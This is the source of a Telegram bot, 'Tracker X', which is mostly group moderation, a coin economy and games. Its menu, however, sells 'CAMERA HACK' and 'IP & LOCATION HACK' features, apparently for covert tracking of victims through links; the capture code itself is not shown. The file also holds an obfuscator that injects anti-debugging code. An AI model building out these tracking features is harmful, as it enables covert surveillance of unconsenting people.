// =====================================================
// 🔱 TRACKER X v3.0 PRO - ULTIMATE EDITION 🔱
// =====================================================
// 👨‍💻 Dev: @Mrddev | 📢 Channel: @devxtechzone
// 💰 New Users: 5 COINS | Tracking: 5 COINS | Referral: 2 COINS
// 🎮 GAMES: Hard win rates (10-40% chance)
// 👑 ADMIN: Full control | Add/Remove coins | Generate codes | Broadcast
// 🛠 DEV TOOLS: Obfuscate | Minify | Validate | Encrypt | Decrypt | Base64 | Hash
// 👥 GROUP: TagAll | Welcome/Goodbye | AntiLink | AntiSpam | Warn/Kick/Ban/Mute | Filters | Captcha | Levels | Sticky | Polls | Giveaways
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const vm = require("vm");
const fs = require("fs");

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ===== MIDDLEWARE =====
app.use(bodyParser.json({ limit: "50mb" }));
app.use(express.static(path.join(__dirname, "public")));

// ===== CONFIG =====
const DOMAIN = process.env.DOMAIN || "https://yourdomain.onrender.com";
const CHANNEL_USERNAME = "@devxtechzone";
const OWNER_ID = parseInt(process.env.OWNER_ID || "6170894121");
const BOT_VERSION = "3.0.0-PRO";

// ========== COIN SETTINGS ==========
const TRACKING_COST = 5;
const NEW_USER_COINS = 5;
const REFERRAL_REWARD = 2;
const DAILY_REWARD = 1;
const WORK_MIN = 1;
const WORK_MAX = 2;
const GAME_BET = 1;

// ========== GLOBAL VARIABLES ==========
let maintenanceMode = false;
let userStates = new Map();

// ========== DATABASES ==========
const users = new Map();
const activeTokens = new Map();
const redeemCodes = new Map();
const userWarnings = new Map();
const activeChats = new Map();
const userWorkCooldown = new Map();
const transactions = [];

// ----- ENHANCED GROUP FEATURES DATABASES -----
const antilinkGroups = new Map(); // Store custom settings per group
const antispamGroups = new Map();
const antispamUsers = new Map();
const welcomeMessages = new Map();
const goodbyeMessages = new Map();
const tagAllCooldown = new Map();
const filterWords = new Map(); // Word filters per group
const groupLevels = new Map(); // Level system per group
const groupCaptchas = new Map(); // Captcha verification
const groupSticky = new Map(); // Sticky messages
const groupNotes = new Map(); // Group notes/announcements
const autoDelete = new Map(); // Auto-delete messages
const slowMode = new Map(); // Slow mode per group
const groupPolls = new Map(); // Active polls
const groupGiveaways = new Map(); // Active giveaways
const giveawayEntries = new Map(); // Giveaway entries
const userMutes = new Map(); // User mutes with time
const userBans = new Map(); // User bans
const groupAdmins = new Map(); // Cache group admins
const groupInviteLinks = new Map(); // Invite links per group
const groupRules = new Map(); // Group rules
const groupLockdown = new Map(); // Group lockdown mode
const profanityFilter = new Map(); // Profanity filter
const linkWhitelist = new Map(); // Whitelisted domains
const userJoinLogs = new Map(); // Join/leave logs
const groupBackup = new Map(); // Group settings backup

// Stats
const botStats = {
  startTime: Date.now(),
  totalCommands: 0,
  totalMessages: 0,
  totalUsers: 0,
  totalGroups: 0,
  totalCoinsGiven: 0,
  totalHacksUsed: 0,
  totalReferrals: 0,
  totalRedeems: 0,
  totalObfuscations: 0,
  totalEncryptions: 0,
  totalDecryptions: 0,
  totalHashes: 0,
  totalBans: 0,
  totalKicks: 0,
  totalMutes: 0,
  totalWarns: 0
};

const TOKEN_EXPIRY_MS = 10 * 60 * 1000;

// Clean expired tokens
setInterval(() => {
  const now = Date.now();
  for (const [token, data] of activeTokens) {
    if (now - data.createdAt > TOKEN_EXPIRY_MS) {
      activeTokens.delete(token);
    }
  }
  // Clean expired mutes
  for (const [key, data] of userMutes) {
    if (now > data.until) {
      userMutes.delete(key);
    }
  }
}, 60000);

// ========== ENCRYPTION ==========
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "tracker-x-pro-secret-key-2024";
const IV_LENGTH = 16;

// ========== ENHANCED CODE OBFUSCATOR ==========
function obfuscateCode(code) {
  try {
    if (!code || code.length === 0) return { success: false, error: "No code provided" };
    if (code.length > 50000) return { success: false, error: "Code too large (max 50,000 chars)" };
    
    let obfuscated = code;
    obfuscated = obfuscated.replace(/\/\/.*$/gm, '');
    obfuscated = obfuscated.replace(/\/\*[\s\S]*?\*\//g, '');
    obfuscated = obfuscated.replace(/\s+/g, ' ');
    obfuscated = obfuscated.replace(/;\s*/g, ';');
    obfuscated = obfuscated.replace(/\{\s+/g, '{');
    obfuscated = obfuscated.replace(/\s+\}/g, '}');
    
    const varRegex = /\b(let|const|var)\s+([a-zA-Z_][a-zA-Z0-9_]*)/g;
    const funcRegex = /\bfunction\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\(/g;
    const namesToRename = new Set();
    let match;
    
    while ((match = varRegex.exec(obfuscated)) !== null) namesToRename.add(match[2]);
    while ((match = funcRegex.exec(obfuscated)) !== null) namesToRename.add(match[1]);
    
    const replacements = new Map();
    for (const name of namesToRename) {
      replacements.set(name, '_0x' + crypto.randomBytes(3).toString('hex'));
    }
    
    for (const [oldName, newName] of replacements) {
      const regex = new RegExp(`\\b${oldName}\\b`, 'g');
      obfuscated = obfuscated.replace(regex, newName);
    }
    
    obfuscated = obfuscated.replace(/(['"])(.*?)\1/g, (match, quote, str) => {
      if (str.length < 50) return `atob('${Buffer.from(str).toString('base64')}')`;
      return match;
    });
    
    const antiDebug = `(function(){if(typeof window!=='undefined'){const start=performance.now();debugger;const end=performance.now();if(end-start>100){console.clear();setTimeout(()=>{location.reload();},100);}}})();`;
    obfuscated = antiDebug + obfuscated;
    obfuscated = `(function(){${obfuscated}})();`;
    
    return {
      success: true,
      obfuscated: obfuscated,
      originalLength: code.length,
      obfuscatedLength: obfuscated.length,
      compression: Math.round((1 - obfuscated.length / code.length) * 100),
      variablesRenamed: namesToRename.size
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function minifyCode(code) {
  try {
    if (!code || code.length === 0) return { success: false, error: "No code provided" };
    let minified = code;
    minified = minified.replace(/\/\/.*$/gm, '');
    minified = minified.replace(/\/\*[\s\S]*?\*\//g, '');
    minified = minified.replace(/\s+/g, ' ');
    minified = minified.replace(/;\s*/g, ';');
    minified = minified.replace(/\{\s+/g, '{');
    minified = minified.replace(/\s+\}/g, '}');
    minified = minified.trim();
    
    return { 
      success: true, 
      minified: minified,
      originalLength: code.length,
      minifiedLength: minified.length,
      reduction: Math.round((1 - minified.length / code.length) * 100)
    };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function validateCode(code) {
  try {
    if (!code || code.length === 0) return { valid: false, error: "No code provided" };
    new vm.Script(code);
    return { valid: true, message: "✅ Code syntax is valid!" };
  } catch (err) {
    return { valid: false, error: err.message };
  }
}

function encryptText(text, password = null) {
  try {
    const key = password ? crypto.createHash('sha256').update(password).digest() : crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();
    const iv = crypto.randomBytes(IV_LENGTH);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    return { success: true, encrypted: iv.toString('hex') + ':' + encrypted };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function decryptText(encryptedData, password = null) {
  try {
    const parts = encryptedData.split(':');
    if (parts.length !== 2) return { success: false, error: "Invalid encrypted data format" };
    const iv = Buffer.from(parts[0], 'hex');
    const encryptedText = parts[1];
    const key = password ? crypto.createHash('sha256').update(password).digest() : crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(encryptedText, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return { success: true, decrypted: decrypted };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function encodeBase64(text) {
  try {
    return { success: true, encoded: Buffer.from(text).toString('base64') };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

function decodeBase64(encoded) {
  try {
    return { success: true, decoded: Buffer.from(encoded, 'base64').toString('utf8') };
  } catch (err) {
    return { success: false, error: "Invalid base64 string" };
  }
}

function generateHash(text, algorithm = 'sha256') {
  try {
    const supportedAlgos = ['md5', 'sha1', 'sha256', 'sha512'];
    if (!supportedAlgos.includes(algorithm)) {
      return { success: false, error: `Unsupported algorithm. Use: ${supportedAlgos.join(', ')}` };
    }
    return { success: true, hash: crypto.createHash(algorithm).update(text).digest('hex'), algorithm: algorithm };
  } catch (err) {
    return { success: false, error: err.message };
  }
}

// ========== HELPER FUNCTIONS ==========
function generateReferralCode(userId) {
  return crypto.createHash('md5').update(userId + Date.now().toString()).digest('hex').substring(0, 8).toUpperCase();
}

function getReferralLink(userId) {
  return `https://t.me/${bot.botInfo?.username || 'TrackerXBot'}?start=ref_${userId}`;
}

function formatMessage(text) {
  return text.trim().replace(/ {12}/g, '');
}

function generateToken() {
  return crypto.randomBytes(16).toString("hex");
}

async function safeEditMessage(ctx, text, extra = {}) {
  try {
    if (ctx.callbackQuery && ctx.callbackQuery.message) {
      return await ctx.editMessageText(text, { parse_mode: "HTML", ...extra });
    } else {
      return await ctx.reply(text, { parse_mode: "HTML", ...extra });
    }
  } catch (err) {
    if (err.message.includes("message is not modified")) return null;
    console.error("Edit error:", err);
    return await ctx.reply(text, { parse_mode: "HTML", ...extra });
  }
}

async function isAdmin(ctx, userId) {
  try {
    const chatMember = await ctx.telegram.getChatMember(ctx.chat.id, userId);
    return ["creator", "administrator"].includes(chatMember.status);
  } catch {
    return false;
  }
}

// ========== INITIALIZE USER ==========
function initUser(userId, referrerId = null) {
  if (!users.has(userId)) {
    const userData = {
      id: userId,
      joinDate: Date.now(),
      lastActive: Date.now(),
      coins: NEW_USER_COINS,
      bank: 0,
      totalEarned: NEW_USER_COINS,
      totalSpent: 0,
      referrals: 0,
      referrer: referrerId,
      referralCode: generateReferralCode(userId),
      usedHacks: 0,
      successfulHacks: 0,
      level: 1,
      xp: 0,
      dailyStreak: 0,
      lastDaily: null,
      gamesPlayed: 0,
      gamesWon: 0,
      gamesLost: 0,
      obfuscationsUsed: 0,
      badges: ["🎁 New User"],
      warnings: 0,
      afk: null,
      notes: []
    };
    
    users.set(userId, userData);
    botStats.totalUsers++;
    botStats.totalCoinsGiven += NEW_USER_COINS;
    
    if (referrerId && users.has(referrerId)) {
      const referrer = users.get(referrerId);
      referrer.coins += REFERRAL_REWARD;
      referrer.referrals += 1;
      referrer.totalEarned += REFERRAL_REWARD;
      if (!referrer.badges.includes("🌟 Recruiter")) referrer.badges.push("🌟 Recruiter");
      users.set(referrerId, referrer);
      botStats.totalReferrals++;
      botStats.totalCoinsGiven += REFERRAL_REWARD;
      
      bot.telegram.sendMessage(referrerId, formatMessage(`
╔══════════════════════════╗
║  🎉 NEW REFERRAL! 🎉     ║
╚══════════════════════════╝

👤 Someone joined using your link!

💰 <b>Reward:</b> <code>+${REFERRAL_REWARD} COINS</code>

📊 <b>Your Stats:</b>
• Total Coins: ${referrer.coins}
• Referrals: ${referrer.referrals}
      `), { parse_mode: "HTML" }).catch(() => {});
    }
  }
  return users.get(userId);
}

function addCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user) {
    user.coins += amount;
    user.totalEarned += amount;
    users.set(userId, user);
    botStats.totalCoinsGiven += amount;
    transactions.push({ userId, amount, reason, date: Date.now() });
    return true;
  }
  return false;
}

function removeCoins(userId, amount, reason) {
  const user = users.get(userId);
  if (user && user.coins >= amount) {
    user.coins -= amount;
    user.totalSpent += amount;
    users.set(userId, user);
    return true;
  }
  return false;
}

// ========== FORCE JOIN CHECK ==========
async function isUserJoined(ctx) {
  try {
    const member = await ctx.telegram.getChatMember(CHANNEL_USERNAME, ctx.from.id);
    return ["creator", "administrator", "member"].includes(member.status);
  } catch {
    return false;
  }
}

// ========== MAIN MENUS ==========
function mainMenu() {
  const referralLink = getReferralLink(OWNER_ID);
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎯 HACKING TOOL", callback_data: "tracking_menu" }, { text: "👑 GROUP", callback_data: "group_menu" }],
        [{ text: "🎮 GAMES", callback_data: "games_menu" }, { text: "💰 ECONOMY", callback_data: "economy_menu" }],
        [{ text: "🏆 LEADERBOARD", callback_data: "leaderboard_menu" }, { text: "🛠 DEV TOOLS", callback_data: "devtools_menu" }],
        [{ text: "👤 PROFILE", callback_data: "profile" }, { text: "📊 STATS", callback_data: "stats" }],
        [{ text: "🎁 REDEEM", callback_data: "redeem_menu" }, { text: "🔗 REFERRAL", callback_data: "referral_info" }],
        [{ text: "📢 CHANNEL", url: "https://t.me/devxtechzone" }, { text: "👨‍💻 DEV", url: "https://t.me/Mrddev" }]
      ]
    }
  };
}

function trackingMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎱 CAMERA HACK", callback_data: "pool" }, { text: "⚡ IP & LOCATION HACK", callback_data: "normal" }],
        [{ text: "◀️ BACK", callback_data: "main_back" }]
      ]
    }
  };
}

function groupMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔊 TAG ALL", callback_data: "tagall" }, { text: "🔊 TAG ADMINS", callback_data: "tagadmins" }],
        [{ text: "👋 WELCOME", callback_data: "set_welcome" }, { text: "👋 GOODBYE", callback_data: "set_goodbye" }],
        [{ text: "🚫 ANTILINK", callback_data: "antilink_toggle" }, { text: "🛡️ ANTISPAM", callback_data: "antispam_toggle" }],
        [{ text: "⚠️ WARN", callback_data: "warn_user" }, { text: "🔨 KICK", callback_data: "kick_user" }],
        [{ text: "🚫 BAN", callback_data: "ban_user" }, { text: "🔇 MUTE", callback_data: "mute_user" }],
        [{ text: "📋 RULES", callback_data: "set_rules" }, { text: "🔒 LOCKDOWN", callback_data: "lockdown_toggle" }],
        [{ text: "🎁 GIVEAWAY", callback_data: "giveaway_menu" }, { text: "📊 POLL", callback_data: "poll_menu" }],
        [{ text: "📌 STICKY", callback_data: "sticky_menu" }, { text: "⏱️ SLOW MODE", callback_data: "slowmode_menu" }],
        [{ text: "📊 GROUP STATS", callback_data: "group_stats" }, { text: "◀️ BACK", callback_data: "main_back" }]
      ]
    }
  };
}

function gamesMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🎲 DICE (33%)", callback_data: "dice_game" }, { text: "🎰 SLOTS (15%)", callback_data: "slots_game" }],
        [{ text: "🔢 GUESS (10%)", callback_data: "guess_game" }, { text: "✊ RPS (33%)", callback_data: "rps_game" }],
        [{ text: "🪙 COIN FLIP (40%)", callback_data: "coinflip" }, { text: "🔥 HIGH RISK (20%)", callback_data: "high_risk" }],
        [{ text: "🏆 LEADERBOARD", callback_data: "game_leaderboard" }, { text: "📊 MY STATS", callback_data: "game_stats" }],
        [{ text: "◀️ BACK", callback_data: "main_back" }]
      ]
    }
  };
}

function economyMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "💰 DAILY", callback_data: "daily" }, { text: "💼 WORK", callback_data: "work" }],
        [{ text: "🏦 BANK", callback_data: "bank_menu" }, { text: "💸 TRANSFER", callback_data: "transfer_menu" }],
        [{ text: "🏆 LEADERBOARD", callback_data: "coin_leaderboard" }, { text: "🎁 REFERRAL", callback_data: "referral_info" }],
        [{ text: "◀️ BACK", callback_data: "main_back" }]
      ]
    }
  };
}

function leaderboardMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "💰 COINS", callback_data: "leaderboard_coins" }, { text: "🎮 GAMES", callback_data: "leaderboard_games" }],
        [{ text: "👥 REFERRALS", callback_data: "leaderboard_referrals" }, { text: "⭐ LEVEL", callback_data: "leaderboard_level" }],
        [{ text: "🔧 TOP HACKERS", callback_data: "leaderboard_hacks" }, { text: "◀️ BACK", callback_data: "main_back" }]
      ]
    }
  };
}

function devToolsMenu() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🔒 OBFUSCATE", callback_data: "obfuscate_code" }, { text: "🗜️ MINIFY", callback_data: "minify_code" }],
        [{ text: "✅ VALIDATE", callback_data: "validate_code" }, { text: "🔐 ENCRYPT", callback_data: "encrypt" }],
        [{ text: "🔓 DECRYPT", callback_data: "decrypt" }, { text: "📝 BASE64", callback_data: "base64" }],
        [{ text: "🔢 HASH", callback_data: "hash" }, { text: "⏰ TIMESTAMP", callback_data: "timestamp" }],
        [{ text: "🎲 RANDOM", callback_data: "random" }, { text: "📋 NOTE", callback_data: "note" }],
        [{ text: "⏰ REMINDER", callback_data: "reminder" }, { text: "💤 AFK", callback_data: "afk" }],
        [{ text: "🔍 WHOIS", callback_data: "whois" }, { text: "📊 SYSTEM", callback_data: "system_info" }],
        [{ text: "◀️ BACK", callback_data: "main_back" }]
      ]
    }
  };
}

// ========== BOT START ==========
bot.start(async (ctx) => {
  let referrerId = null;
  const args = ctx.message.text.split(" ");
  if (args[1] && args[1].startsWith("ref_")) {
    referrerId = parseInt(args[1].replace("ref_", ""));
    if (isNaN(referrerId)) referrerId = null;
  }
  
  const user = initUser(ctx.from.id, referrerId);
  const referralLink = getReferralLink(ctx.from.id);
  
  await ctx.replyWithPhoto("https://files.catbox.moe/v75lmb.jpeg", {
    caption: formatMessage(`
╔══════════════════════════════════╗
║     🔱 TRACKER X v3.0 PRO       ║
║     ⚡ ULTIMATE EDITION         ║
╚══════════════════════════════════╝

✨ <b>Welcome ${ctx.from.first_name}!</b>

┌─────────────────────────────────┐
│ 💰 Balance: ${user.coins} coins          │
│ 📊 Level: ${user.level}                    │
│ 👥 Referrals: ${user.referrals}            │
└─────────────────────────────────┘

🎁 <b>You got ${NEW_USER_COINS} FREE coins!</b>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

<b>🔗 Your Referral Link:</b>
<code>${referralLink}</code>

<i>Share this link - earn ${REFERRAL_REWARD} coins per referral!</i>

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

🎯 <b>Select a module below</b>
    `),
    parse_mode: "HTML",
    ...mainMenu()
  });
});

// ========== ENHANCED TAG ALL FEATURE ==========
bot.action("tagall", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ This command only works in groups!", { show_alert: true });
  }
  
  const isUserAdmin = await isAdmin(ctx, ctx.from.id);
  if (!isUserAdmin) {
    return ctx.answerCbQuery("❌ Only admins can use tag all!", { show_alert: true });
  }
  
  const now = Date.now();
  const lastTag = tagAllCooldown.get(ctx.chat.id) || 0;
  if (now - lastTag < 300000) {
    const minutes = Math.ceil((300000 - (now - lastTag)) / 60000);
    return ctx.answerCbQuery(`⏰ Please wait ${minutes} minutes!`, { show_alert: true });
  }
  
  await ctx.answerCbQuery("📢 Tagging members...");
  
  try {
    const members = await ctx.telegram.getChatAdministrators(ctx.chat.id);
    let mentions = [];
    
    for (const admin of members) {
      if (admin.user.username) {
        mentions.push(`@${admin.user.username}`);
      } else {
        mentions.push(`[${admin.user.first_name}](tg://user?id=${admin.user.id})`);
      }
    }
    
    const message = `📢 **ANNOUNCEMENT FROM ADMIN**\n\n${mentions.join(" ")}\n\n_This is an important announcement from the group admin._`;
    
    await ctx.reply(message, { parse_mode: "Markdown" });
    tagAllCooldown.set(ctx.chat.id, now);
  } catch (err) {
    console.error("TagAll error:", err);
    await ctx.reply("❌ Failed to tag members. Make sure I'm admin and have permission to get member list!");
  }
});

// ========== TAG ADMINS FEATURE ==========
bot.action("tagadmins", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ This command only works in groups!", { show_alert: true });
  }
  
  try {
    const admins = await ctx.telegram.getChatAdministrators(ctx.chat.id);
    let mentions = [];
    
    for (const admin of admins) {
      if (admin.user.username) {
        mentions.push(`@${admin.user.username}`);
      } else {
        mentions.push(`[${admin.user.first_name}](tg://user?id=${admin.user.id})`);
      }
    }
    
    const message = `👑 **GROUP ADMINS**\n\n${mentions.join(" ")}`;
    await ctx.reply(message, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply("❌ Failed to get admins!");
  }
});

// ========== WELCOME & GOODBYE SETUP ==========
bot.action("set_welcome", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  const isUserAdmin = await isAdmin(ctx, ctx.from.id);
  if (!isUserAdmin) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  userStates.set(ctx.from.id, { action: "set_welcome", chatId: ctx.chat.id });
  await safeEditMessage(ctx, formatMessage(`
╔══════════════════════════╗
║  👋 SET WELCOME MESSAGE ║
╚══════════════════════════╝

Send the welcome message you want to set.

<b>Available variables:</b>
• {name} - User's name
• {group} - Group name
• {mention} - User mention
• {count} - Member count

<i>Example:</i>
<code>Welcome {name} to {group}! 🎉</code>

Send your message now:
  `), { parse_mode: "HTML" });
});

bot.action("set_goodbye", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  const isUserAdmin = await isAdmin(ctx, ctx.from.id);
  if (!isUserAdmin) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  userStates.set(ctx.from.id, { action: "set_goodbye", chatId: ctx.chat.id });
  await safeEditMessage(ctx, formatMessage(`
╔══════════════════════════╗
║  👋 SET GOODBYE MESSAGE ║
╚══════════════════════════╝

Send the goodbye message you want to set.

<b>Available variables:</b>
• {name} - User's name
• {group} - Group name

<i>Example:</i>
<code>Goodbye {name}! We'll miss you! 👋</code>

Send your message now:
  `), { parse_mode: "HTML" });
});

// ========== ANTI-LINK TOGGLE ==========
bot.action("antilink_toggle", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  const isUserAdmin = await isAdmin(ctx, ctx.from.id);
  if (!isUserAdmin) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  const current = antilinkGroups.get(ctx.chat.id) || false;
  antilinkGroups.set(ctx.chat.id, !current);
  
  await ctx.answerCbQuery(`Anti-link ${!current ? "ENABLED" : "DISABLED"}!`);
  await safeEditMessage(ctx, `✅ Anti-link ${!current ? "ENABLED" : "DISABLED"} for this group!`);
});

// ========== ANTI-SPAM TOGGLE ==========
bot.action("antispam_toggle", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  const isUserAdmin = await isAdmin(ctx, ctx.from.id);
  if (!isUserAdmin) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  const current = antispamGroups.get(ctx.chat.id) || false;
  antispamGroups.set(ctx.chat.id, !current);
  
  await ctx.answerCbQuery(`Anti-spam ${!current ? "ENABLED" : "DISABLED"}!`);
  await safeEditMessage(ctx, `✅ Anti-spam ${!current ? "ENABLED" : "DISABLED"} for this group!`);
});

// ========== WARN USER ==========
bot.action("warn_user", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  await safeEditMessage(ctx, formatMessage(`
⚠️ <b>WARN USER SYSTEM</b>

Reply to a user's message with:
<code>/warn</code>

<b>Rules:</b>
• 3 warnings = automatic ban
• Warnings reset after 24 hours

<i>Example: Reply to a message and type /warn</i>
  `), { parse_mode: "HTML" });
});

// ========== KICK USER ==========
bot.action("kick_user", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  await safeEditMessage(ctx, formatMessage(`
🔨 <b>KICK USER</b>

Reply to a user's message with:
<code>/kick</code>

<i>Example: Reply to a message and type /kick</i>
  `), { parse_mode: "HTML" });
});

// ========== BAN USER ==========
bot.action("ban_user", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  await safeEditMessage(ctx, formatMessage(`
🚫 <b>BAN USER</b>

Reply to a user's message with:
<code>/ban</code>

<i>Example: Reply to a message and type /ban</i>
  `), { parse_mode: "HTML" });
});

// ========== MUTE USER ==========
bot.action("mute_user", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  await safeEditMessage(ctx, formatMessage(`
🔇 <b>MUTE USER</b>

Reply to a user's message with:
<code>/mute &lt;minutes&gt;</code>

<i>Examples:</i>
• <code>/mute 30</code> - Mute for 30 minutes
• <code>/mute 120</code> - Mute for 2 hours
• <code>/unmute</code> - Unmute user
  `), { parse_mode: "HTML" });
});

// ========== SET RULES ==========
bot.action("set_rules", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  const isUserAdmin = await isAdmin(ctx, ctx.from.id);
  if (!isUserAdmin) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  userStates.set(ctx.from.id, { action: "set_rules", chatId: ctx.chat.id });
  await safeEditMessage(ctx, formatMessage(`
📋 <b>SET GROUP RULES</b>

Send the rules you want to set for this group.

Users can view rules with <code>/rules</code>

Send your rules now:
  `), { parse_mode: "HTML" });
});

// ========== LOCKDOWN TOGGLE ==========
bot.action("lockdown_toggle", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  const isUserAdmin = await isAdmin(ctx, ctx.from.id);
  if (!isUserAdmin) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  const current = groupLockdown.get(ctx.chat.id) || false;
  groupLockdown.set(ctx.chat.id, !current);
  
  if (!current) {
    await ctx.telegram.setChatPermissions(ctx.chat.id, {
      can_send_messages: false,
      can_send_media_messages: false,
      can_send_other_messages: false,
      can_add_web_page_previews: false
    });
    await safeEditMessage(ctx, "🔒 **LOCKDOWN ENABLED!**\n\nOnly admins can send messages.", { parse_mode: "Markdown" });
  } else {
    await ctx.telegram.setChatPermissions(ctx.chat.id, {
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true
    });
    await safeEditMessage(ctx, "🔓 **LOCKDOWN DISABLED!**\n\nAll members can now send messages.", { parse_mode: "Markdown" });
  }
});

// ========== GIVEAWAY MENU ==========
bot.action("giveaway_menu", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  const isUserAdmin = await isAdmin(ctx, ctx.from.id);
  if (!isUserAdmin) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  await safeEditMessage(ctx, formatMessage(`
🎁 <b>GIVEAWAY SYSTEM</b>

<b>Commands:</b>
<code>/giveaway &lt;coins&gt; &lt;winners&gt; &lt;hours&gt;</code>
Example: <code>/giveaway 100 3 24</code>

<code>/endgiveaway</code> - End active giveaway
<code>/reroll</code> - Reroll winners

<i>Giveaway will be pinned automatically!</i>
  `), { parse_mode: "HTML" });
});

// ========== POLL MENU ==========
bot.action("poll_menu", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  const isUserAdmin = await isAdmin(ctx, ctx.from.id);
  if (!isUserAdmin) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  await safeEditMessage(ctx, formatMessage(`
📊 <b>POLL SYSTEM</b>

<b>Commands:</b>
<code>/poll &lt;question&gt; | &lt;option1&gt; | &lt;option2&gt; | ...</code>
Example: <code>/poll Best programming language? | Python | JavaScript | Java</code>

<code>/closepoll</code> - Close active poll

<i>Maximum 10 options!</i>
  `), { parse_mode: "HTML" });
});

// ========== STICKY MENU ==========
bot.action("sticky_menu", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  const isUserAdmin = await isAdmin(ctx, ctx.from.id);
  if (!isUserAdmin) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  userStates.set(ctx.from.id, { action: "set_sticky", chatId: ctx.chat.id });
  await safeEditMessage(ctx, formatMessage(`
📌 <b>STICKY MESSAGE</b>

Send the message you want to keep pinned at the bottom of chat.

<i>This message will be automatically resent when it gets deleted!</i>

Send your sticky message now:
  `), { parse_mode: "HTML" });
});

// ========== SLOW MODE MENU ==========
bot.action("slowmode_menu", async (ctx) => {
  if (!ctx.chat.type?.includes("group") && !ctx.chat.type?.includes("supergroup")) {
    return ctx.answerCbQuery("❌ Groups only!", { show_alert: true });
  }
  
  const isUserAdmin = await isAdmin(ctx, ctx.from.id);
  if (!isUserAdmin) {
    return ctx.answerCbQuery("❌ Admins only!", { show_alert: true });
  }
  
  await safeEditMessage(ctx, formatMessage(`
⏱️ <b>SLOW MODE</b>

<b>Commands:</b>
<code>/slowmode &lt;seconds&gt;</code>
Example: <code>/slowmode 30</code> - 30 seconds between messages

<code>/slowmode off</code> - Disable slow mode

<i>Prevents spam in your group!</i>
  `), { parse_mode: "HTML" });
});

// ========== GROUP STATS ==========
bot.action("group_stats", async (ctx) => {
